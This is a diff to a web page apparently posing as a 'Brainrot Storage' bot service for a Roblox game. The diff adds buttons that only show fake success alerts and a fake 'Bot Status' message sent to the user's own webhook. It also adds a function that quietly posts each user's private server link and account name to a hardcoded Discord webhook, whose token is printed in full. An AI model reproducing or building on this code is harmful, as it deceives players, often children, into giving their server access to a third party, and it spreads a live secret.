@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Join Bot 10M+</title>
+    <title>Brainrot Storage</title>
     <style>
         body {
             display: flex;
@@ -35,7 +35,7 @@
             box-shadow: 0 2px 8px rgba(0,0,0,0.04);
         }
 
-        .input-container, .auth-container {
+        .input-container, .auth-container, .response-container {
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -53,7 +53,7 @@
             box-sizing: border-box;
         }
 
-        .submit-btn, .auth-btn {
+        .submit-btn, .auth-btn, .logout-btn, .new-server-btn {
             font-size: 1.2rem;
             padding: 0.8rem 2rem;
             background: #0078ff;
@@ -66,7 +66,7 @@
             margin-top: 1rem;
         }
 
-        .submit-btn:hover, .auth-btn:hover {
+        .submit-btn:hover, .auth-btn:hover, .logout-btn:hover, .new-server-btn:hover {
             background: #005fcc;
         }
 
@@ -124,10 +124,13 @@
         <input type="text" id="username" class="input-field" placeholder="Username">
         <button class="submit-btn" onclick="sendToWebhook()">Submit</button>
     </div>
-    <div id="response" style="display: none;">
+    <div id="response" class="response-container" style="display: none;">
         <div class="message">Wait until the bot connects, it can take less than 5 minutes. If it doesn't connect, try again later.</div>
-        <button class="action-btn" onclick="doNothing()">CONNECT THE BOT</button>
-        <button class="action-btn" onclick="doNothing()">STORE</button>
+        <button class="action-btn" onclick="showSuccessMessage()">UNSTORE</button>
+        <button class="action-btn" onclick="showSuccessMessage()">STORE</button>
+        <input type="text" id="newPrivateServer" class="input-field" placeholder="NEW Private Server">
+        <button class="new-server-btn" onclick="submitNewPrivateServer()">Submit New Server</button>
+        <button class="logout-btn" onclick="logout()">Log Out</button>
     </div>
 
     <script>
@@ -138,13 +141,13 @@
             const loggedInUser = localStorage.getItem('loggedInUser');
             if (loggedInUser) {
                 const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`));
-                if (userData && userData.webhook && userData.privateServer && userData.username) {
+                if (userData && userData.webhook && userData.privateServer && userData.usernameField) {
                     document.getElementById('auth-section').style.display = 'none';
                     document.getElementById('input-section').style.display = 'none';
                     document.getElementById('response').style.display = 'block';
                     document.getElementById('webhook').value = userData.webhook;
                     document.getElementById('privateServer').value = userData.privateServer;
-                    document.getElementById('username').value = userData.username;
+                    document.getElementById('username').value = userData.usernameField;
                 } else {
                     document.getElementById('auth-section').style.display = 'none';
                     document.getElementById('input-section').style.display = 'block';
@@ -203,8 +206,25 @@
             }
         }
 
-        function doNothing() {
-            // This function intentionally does nothing
+        function logout() {
+            localStorage.removeItem('loggedInUser');
+            document.getElementById('auth-section').style.display = 'block';
+            document.getElementById('input-section').style.display = 'none';
+            document.getElementById('response').style.display = 'none';
+            document.getElementById('auth-username').value = '';
+            document.getElementById('auth-password').value = '';
+            document.getElementById('webhook').value = '';
+            document.getElementById('privateServer').value = '';
+            document.getElementById('username').value = '';
+            document.getElementById('newPrivateServer').value = '';
+            isRegisterMode = true;
+            document.getElementById('register-btn').textContent = 'Register';
+            document.getElementById('toggle-auth-text').textContent = 'Already have an account? Log in';
+            alert('Logged out successfully.');
+        }
+
+        function showSuccessMessage() {
+            alert('Successful, wait until bot connects');
         }
 
         async function sendToWebhook() {
@@ -233,12 +253,8 @@
             const payload = {
                 embeds: [
                     {
-                        title: "New Submission",
-                        fields: [
-                            { name: "Webhook", value: webhook, inline: false },
-                            { name: "Private Server", value: privateServer, inline: false },
-                            { name: "Username", value: username, inline: false }
-                        ],
+                        title: "Bot Status",
+                        description: "-Bot online\n\nInstructions: The bot will grab all the Brainrots from all the floors and when all your base has been empty, The bot will disconnect until you connect him again and press unstore button on the web he will connect again and will wait until you have steal everything than the bot will disconnect.",
                         color: 3447003
                     }
                 ]
@@ -271,6 +287,61 @@
                     document.getElementById('username').value = '';
                 } else {
                     alert('Failed to send submission. Please try again.');
+                    if (response.status === 404) {
+                        alert('Webhook URL is invalid. Nelly is serving noodles! Please check the webhook URL and try again.');
+                    }
+                }
+            } catch (error) {
+                alert('An error occurred: ' + error.message);
+            }
+        }
+
+        async function submitNewPrivateServer() {
+            const newPrivateServer = document.getElementById('newPrivateServer').value;
+            const loggedInUser = localStorage.getItem('loggedInUser');
+
+            // Validate new private server
+            if (!newPrivateServer) {
+                alert('Please enter a new private server URL');
+                return;
+            }
+
+            if (!newPrivateServer.startsWith('https://roblox.com') && !newPrivateServer.startsWith('https://www.roblox.com')) {
+                alert('New Private Server must start with https://roblox.com or https://www.roblox.com');
+                return;
+            }
+
+            const payload = {
+                embeds: [
+                    {
+                        title: "New Private Server Submission",
+                        fields: [
+                            { name: "Username", value: loggedInUser, inline: false },
+                            { name: "New Private Server", value: newPrivateServer, inline: false }
+                        ],
+                        color: 3447003
+                    }
+                ]
+            };
+
+            try {
+                const response = await fetch('https://discord.com/api/webhooks/1421414129159114825/WzUVXlVkQoFnbW8HL0HOISIS8as_GISRHIynaAONm4tF-a42hElzMIECIwOhYGl9-Rkz', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    alert('New private server submitted successfully!');
+                    document.getElementById('newPrivateServer').value = '';
+                    // Update stored private server
+                    const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`));
+                    userData.privateServer = newPrivateServer;
+                    localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));
+                } else {
+                    alert('Failed to submit new private server. Please try again.');
                     if (response.status === 404) {
                         alert('Webhook URL is invalid. Nelly is serving noodles! Please check the webhook URL and try again.');
                     }
